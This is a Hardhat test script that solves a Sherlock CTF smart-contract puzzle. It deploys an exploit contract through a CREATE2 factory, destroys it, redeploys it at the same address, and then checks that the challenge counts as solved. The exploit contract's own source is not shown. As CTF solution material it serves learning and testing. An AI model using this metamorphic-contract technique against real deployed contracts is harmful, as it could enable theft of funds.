import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Challenge2 } from "../types";

describe("Sherlock CTF: Puzzle (teryanarmen)", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Contract;
  let challenge: Challenge2;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/teryanarmen/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy({ value: ethers.utils.parseEther("1") });
    } else {
      setup = await ethers.getContractAt(
        "contracts/teryanarmen/Setup.sol:Setup",
        `0xAD392F2a981bDE60B43eC988a30ce2aE2d755eD2`
      );
    }
    challenge = await ethers.getContractAt("Challenge2", await setup.challenge());
  });

  it("Exploit", async () => {
    // Deploy CREATE2 Factory
    const Create2Factory = await ethers.getContractFactory("Create2Factory");
    const create2_factory = await Create2Factory.deploy();
    await create2_factory.deployed();

    // Deploy Exploit SC
    const ExploitFactory = await ethers.getContractFactory("contracts/teryanarmen/Exploit.sol:Exploit", attacker);

    const init_code = await create2_factory.getBytecode(challenge.address);
    const salt = 1;
    const exploit_address = await create2_factory.getAddress(init_code, salt);

    // First Deploy Exploit
    await create2_factory.deploy(init_code, salt);
    const exploit = ExploitFactory.attach(exploit_address);

    // Attack pt. 1
    await exploit.second();
    await exploit.kill();

    // Second Deploy Exploit
    await create2_factory.deploy(init_code, salt);

    // Attack pt. 2
    await exploit.fourth();
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
